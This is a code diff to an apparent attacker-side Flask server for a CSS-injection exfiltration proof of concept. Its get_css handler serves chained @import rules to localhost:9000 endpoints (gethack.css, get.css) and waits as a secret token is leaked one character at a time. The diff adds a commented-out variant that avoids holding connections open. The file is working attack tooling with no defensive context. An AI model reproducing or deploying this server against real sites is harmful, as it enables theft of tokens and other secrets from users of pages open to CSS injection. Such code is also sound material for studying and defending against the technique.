@@ -1,3 +1,4 @@
+import random
 import time
 
 from flask import Flask, request, render_template
@@ -55,10 +56,26 @@ def get_css():
     char_index = int(request.args.get("i"))
     response = ''
 
+    #
+    # Holding only one connection at a time
+    #
+
     while len(token) < (char_index - 1):
         time.sleep(.1)
     response += '@import url("http://localhost:9000/gethack.css?i=' + str(char_index) + '");\n'
     response += '@import url("http://localhost:9000/get.css?i=' + str(char_index + 1) + '");\n'
+
+
+    #
+    # Without holding any connection ever
+    #
+
+    # if len(token) < (char_index - 1):
+    #     time.sleep(.1)
+    #     response += '@import url("http://localhost:9000/get.css?i=' + str(char_index) + '&'+str(random.getrandbits(16))+'");\n'
+    # else:
+    #     response += '@import url("http://localhost:9000/gethack.css?i=' + str(char_index) + '");\n'
+    #     response += '@import url("http://localhost:9000/get.css?i=' + str(char_index + 1) + '");\n'
 
     return Response(response, mimetype='text/css')
 
